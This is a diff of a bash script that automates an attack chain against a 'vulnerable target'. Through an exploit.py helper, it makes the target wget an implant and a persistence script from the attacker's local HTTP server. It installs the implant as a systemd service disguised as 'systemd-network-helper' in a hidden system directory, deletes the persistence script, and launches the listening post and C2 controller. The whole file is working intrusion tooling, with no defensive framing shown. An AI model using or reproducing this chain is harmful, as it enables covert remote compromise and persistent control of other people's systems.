@@ -1,72 +1,122 @@
 #!/bin/bash
 
-#CONFIG
+set -e
+
 PORT=8000
+TARGET_PORT=8080
+TARGET_ENDPOINT="orders"
 
-
-# Function to display usage
 usage() {
-    echo "Usage: $0 -n SERVICE_NAME -b BINARY_PATH [-d DESCRIPTION] [-a AFTER_TARGET]"
+    echo "Usage: $0 -b IMPLANT_BINARY -p PERSISTENCE_SCRIPT -i TARGET_IP [-l LISTENING_POST] [-c CONTROLLER]"
     echo "  -b    Absolute path to your implant binary"
     echo "  -p    Absolute path to your persistence script"
-    echo "  -i    IP of target"
-	echo "  -l    Absolute path to your listening post script"
-	echo "  -c   Absolute path to your controller script"
+    echo "  -i    IP address of the vulnerable target"
+    echo "  -l    (Optional) Absolute path to listening_post.py"
+    echo "  -c    (Optional) Absolute path to controller.py"
     exit 1
 }
 
-# Parse command line arguments
-while getopts "n:b:d:a:h" opt; do
+while getopts "b:p:i:l:c:h" opt; do
     case "$opt" in
         b) IMPLANT_FILE="$OPTARG" ;;
         p) PERSISTENCE_SCRIPT="$OPTARG" ;;
         i) TARGET_IP="$OPTARG" ;;
-		l) LISTENING_POST="$OPTARG" ;;
-		c) CONTROLLER="$OPTARG" ;;
+        l) LISTENING_POST="$OPTARG" ;;
+        c) CONTROLLER="$OPTARG" ;;
+        h) usage ;;
+        *) usage ;;
     esac
 done
 
-#GET LOCAL IP (MacOS & Linux supported)
-if [[ "$OSTYPE" == "darwin"* ]]; then
-	LOCAL_IP=$(ipconfig getifaddr en0)
-else
-	LOCAL_IP=$(hostname -I | awk '{print $1}')
+# Validate required arguments
+if [ -z "$IMPLANT_FILE" ] || [ -z "$PERSISTENCE_SCRIPT" ] || [ -z "$TARGET_IP" ]; then
+    echo "[!] Error: -b, -p, and -i are required."
+    usage
 fi
 
-#START PYTHON SERVER
-echo "[*] Starting HTTP server at $LOCAL_IP:$PORT"
-python3 -m http.server $PORT > /dev/null 2>&1 &
+for f in "$IMPLANT_FILE" "$PERSISTENCE_SCRIPT"; do
+    if [ ! -f "$f" ]; then
+        echo "[!] Error: File not found: $f"
+        exit 1
+    fi
+done
+
+# Determine local IP
+if [[ "$OSTYPE" == "darwin"* ]]; then
+    LOCAL_IP=$(ipconfig getifaddr en0 2>/dev/null || echo "127.0.0.1")
+else
+    LOCAL_IP=$(hostname -I | awk '{print $1}')
+fi
+
+IMPLANT_NAME=$(basename "$IMPLANT_FILE")
+PERSIST_NAME=$(basename "$PERSISTENCE_SCRIPT")
+REMOTE_DIR="/var/lib/systemd/catalog"
+REMOTE_IMPLANT="$REMOTE_DIR/$IMPLANT_NAME"
+SERVICE_NAME="systemd-network-helper"
+
+# Helper: send command via exploit.py
+send_cmd() {
+    python3 exploit.py "http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/" "$1"
+}
+
+# ----------------------------------------------------------------------
+# 1. Start local HTTP server
+# ----------------------------------------------------------------------
+echo "[*] Starting HTTP server at http://$LOCAL_IP:$PORT"
+python3 -m http.server "$PORT" >/dev/null 2>&1 &
 SERVER_PID=$!
 sleep 2
 
+# ----------------------------------------------------------------------
+# 2. Upload implant & persistence script
+# ----------------------------------------------------------------------
+echo "[*] Uploading implant binary..."
+send_cmd "mkdir -p $REMOTE_DIR"
+send_cmd "wget -q http://$LOCAL_IP:$PORT/$IMPLANT_NAME -O $REMOTE_IMPLANT"
+send_cmd "chmod +x $REMOTE_IMPLANT"
 
-#UPLOAD IMPLANT
-echo "[*] Uploading implant to target..."
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$IMPLANT_FILE"
+echo "[*] Uploading persistence script..."
+send_cmd "wget -q http://$LOCAL_IP:$PORT/$PERSIST_NAME -O /tmp/$PERSIST_NAME"
+send_cmd "chmod +x /tmp/$PERSIST_NAME"
 
-#GET PERSISTENCE
-echo "[*] Uploading persistence script to target..."
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "wget http://$LOCAL_IP:$PORT/$PERSISTENCE_SCRIPT"
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "chmod +x ./$PERSISTENCE_SCRIPT"
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "./$PERSISTENCE_SCRIPT -n systemd-network-helper -b /var/lib/systemd/catalog/$IMPLANT_FILE -a network.target"
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "rm ./$PERSISTENCE_SCRIPT"
-echo "[*] Persistence achieved, cleaning script"
+echo "[*] Installing persistence (requires root)..."
+send_cmd "/tmp/$PERSIST_NAME -n $SERVICE_NAME -b $REMOTE_IMPLANT -d 'Network Helper Daemon' -a network.target"
+send_cmd "rm -f /tmp/$PERSIST_NAME"
+echo "[+] Persistence installed."
 
-#KILL SERVER
-echo "[*] Implant hidden at /var/lib/systemd/catalog, stopping HTTP server..."
-kill $SERVER_PID
+# ----------------------------------------------------------------------
+# 3. Stop HTTP server & launch implant
+# ----------------------------------------------------------------------
+echo "[*] Stopping HTTP server..."
+kill $SERVER_PID 2>/dev/null || true
 
-#RUN IMPLANT
-echo "[*] Starting implant..."
-python3 exploit.py "http://$TARGET_IP:8080/orders/" "cd /var/lib/systemd/catalog ./$IMPLANT_FILE" > /dev/null 2>&1 &
-echo "[*] COMPLETED"
-echo "[*] IMPLANT IS RUNNING ON TARGET"
+echo "[*] Launching implant now..."
+send_cmd "cd $REMOTE_DIR && nohup ./$IMPLANT_NAME >/dev/null 2>&1 &"
+echo "[+] Implant is running."
 
+# ----------------------------------------------------------------------
+# 4. Start listening post (with proper .env loading)
+# ----------------------------------------------------------------------
+if [ -n "$LISTENING_POST" ]; then
+    LP_DIR=$(dirname "$LISTENING_POST")
+    LP_FILE=$(basename "$LISTENING_POST")
+    echo "[*] Starting listening post in $LP_DIR"
+    (cd "$LP_DIR" && python3 "$LP_FILE") &
+    LP_PID=$!
+    sleep 3
+fi
 
-#START LISTENING POST
-echo "[*] Starting listening post"
-python3 $LISTENING_POST
+# ----------------------------------------------------------------------
+# 5. Start controller (also in its own directory if needed)
+# ----------------------------------------------------------------------
+if [ -n "$CONTROLLER" ]; then
+    CTRL_DIR=$(dirname "$CONTROLLER")
+    CTRL_FILE=$(basename "$CONTROLLER")
+    echo "[*] Starting controller in $CTRL_DIR"
+    (cd "$CTRL_DIR" && python3 "$CTRL_FILE" "$LOCAL_IP" 5000)
+fi
 
-#START C2 Controller
-echo "[*] Starting controller"
-python3 $CONTROLLER
+# Wait for listening post if it was started
+if [ -n "$LP_PID" ]; then
+    wait $LP_PID
+fi
